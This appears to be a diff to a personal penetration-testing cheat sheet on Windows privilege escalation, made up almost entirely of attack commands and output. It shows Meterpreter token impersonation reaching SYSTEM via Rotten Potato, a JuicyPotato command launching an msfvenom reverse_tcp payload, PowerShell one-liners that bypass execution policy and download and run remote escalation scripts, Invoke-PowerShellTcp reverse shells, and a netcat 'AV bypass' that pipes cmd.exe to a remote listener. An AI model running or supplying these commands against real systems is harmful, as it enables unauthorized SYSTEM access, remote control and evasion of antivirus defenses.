@@ -51,3 +51,85 @@ OUTPUT
 
 RW daclsvc
 	SERVICE_QUERY_CONFIG
+------------------------------------------------------------------------------------------------------------------------------
+																		HOT POTATO
+							HOT POTATO
+							
+	• MS16-075: Security Update for Windows SMB Server (3164038) - Important
+	meterpreter > load incognito
+	Loading extension incognito...Success.
+	meterpreter > list_tokens -u
+	[-] Warning: Not currently running as SYSTEM,
+	 not all tokens will be available             Call rev2self if primary process token is SYSTEM
+	Delegation Tokens Available========================================
+	IIS APPPOOL\DefaultAppPoo
+	lImpersonation Tokens Available========================================
+	NT AUTHORITY\IUSR
+	meterpreter > execute -f rottenpotato.exe Process 1896 created.meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"[-] Warning: Not currently running as SYSTEM, not all tokens will be available             Call rev2self if primary process token is SYSTEM[-] No delegation token available[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+	meterpreter > getuidServer username: NT AUTHORITY\SYSTEM
+
+------------------------------------------------------------------------------------------------------------------------------
+
+							JuicyPotato
+							
+	whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	Privilege Name                Description                               State   
+	============================= ========================================= ========
+	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+	SeShutdownPrivilege           Shut down the system                      Disabled
+	SeAuditPrivilege              Generate security audits                  Disabled
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+	SeUndockPrivilege             Remove computer from docking station      Disabled
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled   <------ JuicyPotato
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+	SeTimeZonePrivilege           Change the time zone                      Disabled
+	
+	
+
+	• msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.11.11 LPORT=8448 -f exe > shell.exe
+JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}  -a "/c C:\Users\Destitute\Desktop\shell.exe"
+
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://localhost/PowerUp.ps1') ; Invoke-AllChecks"
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+				POWERSHELL EXEC BYPASS AND RUN PRIV ESC SCRIPTS
+					
+	• powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://localhost/PowerUp.ps1') ; Invoke-AllChecks"
+	• powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+	• powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
+	• powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+	powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+	
+	
+
+------------------------------------------------------------------------------------------------------------------------------
+
+					REVERSE SHELL
+• cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.10.10./Invoke-PowerShellTcp.ps1")
+
+• powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+
+------------------------------------------------------------------------------------------------------------------------------
+
+					AV BYPASS
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/
+
+KALI:
+root@kali: nc –lnvp 6666
+
+WINDOWS
+C:\users\user1>net use y: \\10.10.10.11\shared
+C:\users\user1>\\10.10.10.11\shared\nc.exe 10.10.10.12 6666 –e cmd.exe
+
+
+					
+					
